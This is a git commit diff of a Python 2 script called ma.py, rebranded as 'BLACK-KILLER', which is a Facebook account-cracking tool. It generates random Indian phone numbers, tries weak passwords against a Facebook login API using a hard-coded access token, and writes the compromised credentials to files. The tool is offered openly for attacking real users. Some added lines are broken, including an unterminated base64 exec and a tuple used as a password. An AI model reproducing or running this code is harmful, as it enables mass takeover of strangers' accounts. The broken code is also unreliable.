544b0d394ad36104a58b8c9583374f336e9b5ad5
BLACK-KILLER <63947251+ShuBhamg0sain@users.noreply.github.com>
2020-11-02 08:05:28 +0530

    Update ma.py

--- BLACK/KILLER/ma.py
+++ BLACK/KILLER/ma.py
@@ -1,6 +1,33 @@
+#CYBER NAME BLACK-KILLER
+#GITHUB: https://github.com/ShuBhamg0sain
+#WHATAPP NO +919557777030
+import marshal, base64
+exec(base64.b64decode("
+
+#CYBER NAME BLACK-KILLER
+#GITHUB: https://github.com/ShuBhamg0sain
+#WHATAPP NO +919557777030
+import os
+CorrectUsername = "g0sain"
+CorrectPassword = "sim"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;96m[#] \x1b[0;36m Enter Username\x1b[1;92m➤ ")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;96m[#] \x1b[0;36m Enter Password\x1b[1;92m➤ ")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username #fb-cloning-id SG
+            loop = 'false'
+        else:
+            print "Wrong password!"
+            os.system('xdg-open https://www.instagram.com/shubham_g0sain/?hl=en')
+    else:
+        print "Wrong username!"
+        os.system('xdg-open https://www.instagram.com/shubham_g0sain/?hl=en')
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(100000):
+for n in range(1000000):
 
     nmbr = random.randint(1111111, 9999999)
 
@@ -47,24 +74,38 @@ def t():
     time.sleep(1)
 def cb():
     os.system('clear')
-##### Dev : Arbab Ali Memon#####
+##### Dev : ShuBhamg0sain#####
 ##### LOGO #####
 logo='''
-\033[1;91m█▀▄▀█ █▀▀█ █▀▀ ░▀░ █▀▀█
-\033[1;93m█░▀░█ █▄▄█ █▀▀ ▀█▀ █▄▄█
-\033[1;92m▀░░░▀ ▀░░▀ ▀░░ ▀▀▀ ▀░░▀
-
-\033[1;97m█░█ ░▀░ █░░ █░░ █▀▀ █▀▀█
-\033[1;96m█▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
-\033[1;95m▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀
+\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•
+\033[1;97m	                                    
+\033[1;97m                      :::!~!!!!!:. 
+\033[1;97m                  .xUHWH!! !!?M88WHX:.
+\033[1;97m                .X*#M@$!!  !X!M$$$$$$WWx:.
+\033[1;97m               :!!!!!!?H! :!$!$$$$$$$$$$8X:
+\033[1;97m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
+\033[1;97m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
+\033[1;91m             ~!~!!!! .: BLACK-KILLER$$$$RMM!
+\033[1;97m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
+\033[1;97m               ~?WuxiW*`   `"#$$$$8!!!!??!!!
+\033[1;97m             :X- M$$$$       `"T#$T~!8$WUXU~
+\033[1;97m            :%`  ~#$$$m:        ~!~ ?$$$$$$
+\033[1;97m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*" 
+\033[1;97m.....   -~~\033[1;91m:<` !    ~?T#$$@@W@*?$$      /`
+\033[1;97mW$@@M!!! .!~~ \033[1;91m!!     .:XUW$W!~ `"~:    :
+\033[1;97m#"~~`.:x%`!!  \033[1;91m!H:   !WM$$$$Ti.: .!WUn+!`
+\033[1;97m:::~:!!`:X~ .:\033[1;92m ?H.!u "$$$B$$$!W:U!T$$M~
+\033[1;97m.~~   :X@!.-~   \033[1;92m?@WTWo("*$$$W$TH$! `
+\033[1;97mWi.~!X$?!-~    : \033[1;92m?$$$B$Wu("**$RM!
+\033[1;97m$R@i.~~ !     :   \033[1;92m~$$$$$B$$en:``    
+\033[1;97m?MXT@Wx.~    :     \033[1;92m~"##*$$$$M~   
+\033[1;47m                  \033[1;31mShuBhamg0sain                \033[1;0m
 \x1b[1;93m--------------------------------------------------------------
-\x1b[1;92m➣  NAME  : FAROOQ ANSARI
-\x1b[1;91m➣  CYBER NAME : MAFIA-KILLER
-\x1b[1;93m➣  WHATSAPP NO     : +92132197796
+\x1b[1;92m➣  NAME  : Shubhamg0sain
+\x1b[1;91m➣  CYBER NAME : BLACK-KILLER
+\x1b[1;93m➣  WHATSAPP NO     : +919557777030
 \x1b[1;95m➣  WARNING  : DON,T CALL ME ONLY TEXT
-\x1b[1;96m➣  FUNNY LINE : AGEA ME JAWAN HO KE
 \x1b[1;97m➣  NOTE     : USE FAST 4G SIM NET
-\x1b[1;94m➣  DISCLAMIAR :AWAY FROM ILLIGAL WAY.
 \x1b[1;93m--------------------------------------------------------------"""
                                 '''
 
@@ -78,14 +119,14 @@ def menu():
         print logo
         print "\033[1;92mCYBER_HACKER_GLAXY_R.H.P_1.286-Wellcome"
         print
-        print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
-        print "\033[1;92m[1]  MOBILINK"
-        print "\033[1;92m[2]  TELINOR"
-        print "\033[1;92m[3]  WARID"
-        print "\033[1;92m[4]  UFONE"
-        print "\033[1;92m[5]  ZONG"
+        print "\033[1;91mATTACK ON Indian Ids"
+        print "\033[1;92m[1]  starter 919"
+        print "\033[1;92m[2]  starter 918 "
+        print "\033[1;92m[3]  starter 917"
+        print "\033[1;92m[4]  my whatapp group"
+        print "\033[1;92m[5]  my instagram id"
         print "\033[1;92m[6]  UPDATE SYSTEM"
-        print "\033[1;92m[0]  EXIT_KALTI MAR"
+        print "\033[1;92m[0]  FOR EXIT"
         print 50*'-'
         action()
 
@@ -100,7 +141,6 @@ def action():
                 print "\033[1;91mENTER THE CODE HERE"
                 print "\033[1;95m536, 559, 621, 005, 198, 935, 936 "
                 print "\033[1;95m559, 621, 651, 695, 794, 956, 793,"
-                print "\033[1;95m180, 440, 441, 490, 491, 492, 493, 494,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
                         k="+919"
@@ -117,7 +157,6 @@ def action():
                 print "\033[1;91mENTER THE CODE HERE"
                 print "\033[1;94m009, 127, 173, 174, 175,"
                 print "\033[1;95m400, 756, 853, 953,"
-                print "\033[1;95m331, 332, 333, 500, 985,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
                         k="+918"
@@ -134,7 +173,6 @@ def action():
                 print "\033[1;91mENTER THE CODE HERE"
                 print "\033[1;94m388, 607, 897, 755,"
                 print "\033[1;95m755,"
-                print "\033[1;95m382,"
                 try:
                         c = raw_input(" SELECTED CODE: ")
                         k="+917"
@@ -147,11 +185,11 @@ def action():
                         menu()
         elif bch =="4":
                 os.system('xdg-open https://chat.whatsapp.com/JtCW38B01hjAGwlVHhyu5q')
-                print "\033[1;91mrun allsim by python2 s.py"
+                print "\033[1;91mrun allsim by python2 S.py"
                 
         elif bch =="5":
                 os.system('xdg-open https://chat.whatsapp.com/JyqQKyXuw3f43Ll90pHSMO')
-                print "\033[1;91mrun allsim by python2 s.py"
+                print "\033[1;91mrun allsim by python2 S.py"
                 
         elif bch =="6":
             os.system("clear")
@@ -162,7 +200,7 @@ def action():
             print
             psb (" Tool has been successfully updated")
             time.sleep(2)
-            os.system("python2 .README.md")
+            os.system("python2 S.py")
 #       elif chb =='3':
 #           os.system('xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl')
 #           time.sleep(1)
@@ -178,9 +216,7 @@ def action():
         time.sleep(0.5)
         psb ('[✓] Please wait, process is running ...')
         time.sleep(0.5)
-        psb ('[✓] Last 07 Digit Crack,pakistan,786786 Found ...')
-        time.sleep(0.5)
-        psb ('[!] Kalti Marne Ke lye(To Exit) Press CTRL Then Press z')
+        psb ('[!] (for Exit) Press CTRL Then Press z')
         time.sleep(0.5)
         print 50*'-'
         print
@@ -198,7 +234,7 @@ def action():
                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                         q = json.load(data)
                         if 'access_token' in q:
-                                print '\x1b[1;91mMAFIA-KILLER-HACKED\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
+                                print '\x1b[1;91mBLACK-KILLER-HACKED\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
                                 okb = open('save/successfull.txt', 'a')
                                 okb.write(k+c+user+'|'+pass1+'\n')
                                 okb.close()
@@ -215,7 +251,7 @@ def action():
                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                         q = json.load(data)
                                         if 'access_token' in q:
-                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
+                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2       
                                                 okb = open('save/successfull.txt', 'a')
                                                 okb.write(k+c+user+'|'+pass2+'\n')
                                                 okb.close()
@@ -228,24 +264,41 @@ def action():
                                                         cps.close()
                                                         cpb.append(c+user+pass2)
                                                 else:
-                                                        pass3 = '786786'
+                                                        pass3 = (k + c + user)
                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                         q = json.load(data)
                                                         if 'access_token' in q:
-                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
                                                                 okb = open('save/successfull.txt', 'a')
                                                                 okb.write(k+c+user+'|'+pass3+'\n')
                                                                 okb.close()
                                                                 oks.append(c+user+pass3)
                                                         else:
                                                                 if 'www.facebook.com' in q['error_msg']:
-                                                                            print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
-                                                                            cps = open('save/checkpoint.txt', 'a')
-                                                                            cps.write(k+c+user+'|'+pass3+'\n')
-                                                                            cps.close()
-                                                                            cpb.append(c+user+pass3)
+                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+                                                                        cps = open('save/checkpoint.txt', 'a')
+                                                                        cps.write(k+c+user+'|'+pass3+'\n')
+                                                                        cps.close()
+                                                                        cpb.append(c+user+pass3)
+                                                                else:
+                                                                        pass4 = (111111 , 999999)
+                                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                                                        q = json.load(data)
+                                                                        if 'access_token' in q:
+                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                okb = open('save/successfull.txt', 'a')
+                                                                                okb.write(k+c+user+'|'+pass4+'\n')
+                                                                                okb.close()
+                                                                                oks.append(c+user+pass4)
+                                                                        else:
+                                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                        cps = open('save/checkpoint.txt', 'a')
+                                                                                        cps.write(k+c+user+'|'+pass4+'\n')
+                                                                                        cps.close()
+                                                                                        cpb.append(c+user+pass4)
 
-
+   
                 except:
                         pass
 
@@ -256,7 +309,7 @@ def action():
         print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
         print('[✓] CP File Has Been Saved : save/checkpoint.txt')
         raw_input('\n[Press Enter To Go Back]')
-        os.system('python2 .README.md')
+        os.system('python2 S.py')
 
 if __name__ == '__main__':
         menu()
